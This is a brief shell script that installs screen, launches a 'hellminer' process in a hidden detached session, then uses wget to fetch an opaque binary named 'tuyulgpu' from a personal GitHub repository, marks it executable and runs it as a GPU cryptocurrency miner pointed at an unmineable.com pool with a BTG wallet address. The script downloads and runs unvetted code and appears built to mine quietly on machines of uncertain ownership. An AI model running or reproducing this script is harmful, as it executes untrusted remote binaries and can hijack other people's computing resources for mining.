#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS random ./hellminer 65 75
wget https://github.com/nuri655/nur/raw/main/tuyulgpu
chmod +x tuyulgpu
./tuyulgpu --algo ETCHASH --pool etchash.unmineable.com:3333 --user BTG:GXgga35GTF5xn2v6u8mhY3xU3phbwh9KzH.uy
